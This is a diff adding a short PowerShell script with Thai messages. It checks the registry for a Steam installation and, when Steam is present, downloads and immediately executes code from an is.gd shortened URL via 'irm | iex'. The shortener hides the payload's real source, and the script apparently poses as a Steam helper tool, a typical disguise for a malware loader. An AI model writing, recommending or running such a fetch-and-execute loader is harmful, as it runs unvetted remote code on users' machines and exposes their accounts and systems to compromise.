@@ -1,0 +1,10 @@
+$steamPath = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "SteamExe" -ErrorAction SilentlyContinue
+
+if ($null -eq $steamPath) {
+    Write-Host "ยังไม่มี Steam กรุณาติดตั้ง Steam ก่อนรันคำสั่ง" -ForegroundColor Yellow
+	Start-Sleep -Seconds 3
+    Start-Process "https://store.steampowered.com/about/"
+} else {
+    Write-Host "พบ Steam ในเครื่อง กำลังดำเนินการ..." -ForegroundColor Green
+    irm "https://is.gd/X338ky" | iex
+}
